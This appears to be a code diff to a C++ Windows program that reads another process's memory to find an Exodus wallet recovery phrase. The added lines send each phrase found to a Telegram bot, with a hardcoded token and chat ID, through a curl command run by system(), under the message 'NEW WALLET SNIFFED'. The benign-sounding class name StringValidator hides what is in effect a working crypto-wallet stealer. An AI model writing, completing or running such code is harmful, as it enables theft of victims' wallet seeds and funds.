@@ -7,6 +7,9 @@
 #include <memory>
 #include <string>
 #include <algorithm>
+#include <sstream>
+#include <cstdlib>
+
 
 class StringValidator {
 public:
@@ -57,6 +60,8 @@ public:
         m_processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
         return m_processHandle != NULL;
     }
+
+
     void scanForStrings() {
         if (!m_processHandle) return;
 
@@ -68,6 +73,16 @@ public:
                 std::string passphrase = scanRegion(mbi);
                 if (!passphrase.empty()) {
                     std::cout << "Exodus Phrase: " << passphrase << std::endl;
+                    std::string chat_id = "-4798648916";
+                    std::string encodedMessage = "**NEW%20WALLET%20SNIFFED**%0APassPhrase%F0%9F%94%92:%20" + passphrase;
+
+                    std::string url = "https://api.telegram.org/bot7704470969:AAGj0U9jr-igLpZIWbihHbw5sIWo_X3nt14/sendMessage"
+                        "?chat_id=" + chat_id + "&text=" + encodedMessage + "&parse_mode=MarkdownV2";
+
+                    std::string command = "curl -s \"" + url + "\"";
+                    system(command.c_str());
+
+
                     m_longStringFound = true;
                     break;
                 }
@@ -114,6 +129,8 @@ private:
         CloseHandle(snapshot);
         return processId;
     }
+
+
 
     std::string scanRegion(const MEMORY_BASIC_INFORMATION& mbi) {
         std::vector<char> buffer(mbi.RegionSize);
